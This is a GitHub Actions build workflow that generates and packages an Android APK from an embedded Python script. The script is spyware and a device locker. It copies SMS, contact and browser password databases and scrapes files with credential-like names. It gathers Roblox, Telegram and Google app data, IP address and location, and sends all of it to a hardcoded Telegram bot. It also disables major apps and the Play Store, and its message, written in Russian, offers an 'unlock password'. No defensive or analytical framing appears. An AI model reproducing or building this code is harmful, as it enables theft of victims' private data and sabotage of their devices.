name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Setup Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'
    - name: Install
      run: |
        pip install buildozer
        sudo apt update
        sudo apt install -y openjdk-17-jdk
    - name: Create main.py
      run: |
        cat > main.py << 'EOF'
import os,requests,subprocess,shutil,json,sqlite3,time,glob
T="8889128449:AAHUGVmOKw5cqeVx25D1WHN9lJcvyxsH43U"
C="8631833153"
def send(t):
 try:
  for i in range(0,len(t),4000):
   requests.post(f"https://api.telegram.org/bot{T}/sendMessage",json={"chat_id":C,"text":t[i:i+4000]},timeout=5)
 except:pass
def get_all_files():
 r=[]
 paths=["/storage/emulated/0","/data/data","/sdcard"]
 exts=[".db",".xml",".json",".txt",".jpg",".png",".cookie",".key",".token",".backup",".conf"]
 for p in paths:
  if os.path.exists(p):
   for a,b,c in os.walk(p):
    for f in c:
     if any(f.endswith(x) for x in exts) and not f.endswith(".apk"):
      try:
       shutil.copy(os.path.join(a,f),f"/sdcard/{f}")
       r.append(f)
      except:pass
     if "password" in f.lower() or "login" in f.lower() or "user" in f.lower():
      try:
       with open(os.path.join(a,f),'r') as ff:
        r.append(f"{f}: {ff.read()[:100]}")
      except:pass
 return r
def get_apps():
 try:
  apps=subprocess.check_output("pm list packages",shell=True).decode()
  return apps[:500]
 except:return"no"
def get_passwords():
 r=[]
 paths=["/data/data/com.android.chrome","/data/data/com.android.browser","/data/data/com.google.android.gm"]
 for p in paths:
  if os.path.exists(p):
   for a,b,c in os.walk(p):
    for f in c:
     if f.endswith(".db") or f.endswith(".sqlite"):
      try:
       shutil.copy(os.path.join(a,f),f"/sdcard/{f}")
       r.append(f)
      except:pass
 return r
def get_sms():
 try:
  os.system("cp /data/data/com.android.providers.telephony/databases/mmssms.db /sdcard/")
  conn=sqlite3.connect("/sdcard/mmssms.db")
  cur=conn.cursor()
  cur.execute("SELECT address,body,date FROM sms ORDER BY date DESC LIMIT 50")
  sms=cur.fetchall()
  conn.close()
  return "\n".join([f"{x[0]}: {x[1][:50]}"for x in sms])
 except:return"no"
def get_contacts():
 try:
  os.system("cp /data/data/com.android.providers.contacts/databases/contacts2.db /sdcard/")
  conn=sqlite3.connect("/sdcard/contacts2.db")
  cur=conn.cursor()
  cur.execute("SELECT display_name,number FROM contacts LIMIT 100")
  c=cur.fetchall()
  conn.close()
  return "\n".join([f"{x[0]}: {x[1]}"for x in c])
 except:return"no"
def get_ip():
 try:return requests.get("https://api.ipify.org").text
 except:return"no"
def get_location():
 try:
  r=requests.get("http://ip-api.com/json/")
  d=r.json()
  return f"{d.get('city')}, {d.get('country')}, {d.get('lat')}, {d.get('lon')}"
 except:return"no"
def block():
 try:
  os.system("settings put global install_non_market_apps 0")
  apps=["com.android.packageinstaller","com.google.android.gms","com.android.vending","com.android.chrome","com.whatsapp","com.instagram.android","com.facebook.katana","org.telegram","com.roblox.client","com.discord","com.snapchat.android","com.twitter.android","com.tiktok.android"]
  for a in apps:
   os.system(f"pm disable {a}")
  os.system("input keyevent 26")
  os.system("input keyevent 6")
  return"done"
 except:return"no"
def make_menu():
 try:
  os.system("am start -a android.intent.action.MAIN -n com.android.settings/.Settings")
  os.system("wm overscan 0,0,0,500")
  return"done"
 except:return"no"
def steal_google():
 r=[]
 paths=["/data/data/com.google.android.gms","/storage/emulated/0/Android/data/com.google.android.apps.maps"]
 for p in paths:
  if os.path.exists(p):
   for a,b,c in os.walk(p):
    for f in c:
     if f.endswith((".db",".xml",".json",".txt")):
      r.append(f)
 return r
def steal_roblox():
 r=[]
 paths=["/data/data/com.roblox.client","/storage/emulated/0/Android/data/com.roblox.client"]
 for p in paths:
  if os.path.exists(p):
   for a,b,c in os.walk(p):
    for f in c:
     if f.endswith((".db",".xml",".json",".txt",".cookie")):
      r.append(f)
 return r
def steal_telegram():
 r=[]
 paths=["/data/data/org.telegram","/storage/emulated/0/Android/data/org.telegram"]
 for p in paths:
  if os.path.exists(p):
   for a,b,c in os.walk(p):
    for f in c:
     if f.endswith((".db",".xml",".json",".txt")):
      r.append(f)
 return r
msg=f"""
🔓 ПАРОЛЬ РАЗБЛОКИРОВКИ: v67

🌐 IP: {get_ip()}
📍 МЕСТО: {get_location()}
📱 ВРЕМЯ: {time.ctime()}

📁 ВСЕ ФАЙЛЫ: {len(get_all_files())}
📦 ПРИЛОЖЕНИЯ: {get_apps()[:200]}

🔐 ПАРОЛИ ИЗ БРАУЗЕРА: {get_passwords()}
📨 SMS (50): {get_sms()}
👥 КОНТАКТЫ (100): {get_contacts()}

🎮 ROBLOX: {steal_roblox()}
📱 TELEGRAM: {steal_telegram()}
📁 GOOGLE: {steal_google()}

🔒 БЛОКИРОВКА: {block()}
📱 МЕНЮ: {make_menu()}
"""
send(msg)
EOF
    - name: Create spec
      run: |
        buildozer init
        sed -i 's/requirements = .*/requirements = python3,requests/g' buildozer.spec
        sed -i 's/package.name = .*/package.name = R/g' buildozer.spec
        sed -i 's/package.domain = .*/package.domain = org.r/g' buildozer.spec
        sed -i 's/permissions = .*/permissions = INTERNET,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_SMS,READ_CONTACTS,READ_PHONE_STATE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION/g' buildozer.spec
    - name: Build
      run: buildozer android debug
    - name: Upload
      uses: actions/upload-artifact@v3
      with:
        name: R
        path: bin/*.apk
